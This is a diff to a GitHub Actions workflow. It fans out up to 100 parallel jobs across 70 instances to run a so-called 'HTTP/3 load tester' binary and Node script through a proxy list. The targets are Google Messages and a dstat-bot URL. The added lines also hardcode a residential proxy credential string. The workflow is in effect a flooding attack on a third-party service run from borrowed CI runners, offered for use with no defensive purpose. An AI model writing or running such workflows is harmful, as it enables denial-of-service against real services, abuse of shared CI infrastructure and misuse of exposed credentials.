@@ -11,7 +11,7 @@ jobs:
   parallel-execution-ubuntu:
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 3
+      max-parallel: 100
       fail-fast: false  # Continue even if some instances fail
       matrix:
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70]
@@ -33,7 +33,7 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install  hpack
+        run: npm install  hpack chalk
             
       - name: Run HTTP/3 load tester
         run: |
@@ -42,7 +42,10 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x m
-          ./m https://messages.google.com/web/ 700 1 1 90.txt 
+          cd Fc-main
+          echo "geonode_DJDQT1IiE9-type-residential:5f5a9d7a-c40b-4e86-b83d-f0bf12f4594a@92.204.164.15:9000" > output.txt
+          node a.js GET https://c2.dstatbot.win/X0ojjz1y 300 4 90 output.txt --full --debug --auth true
+          ./m https://messages.google.com/web/ 700 1 1 output.txt 
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
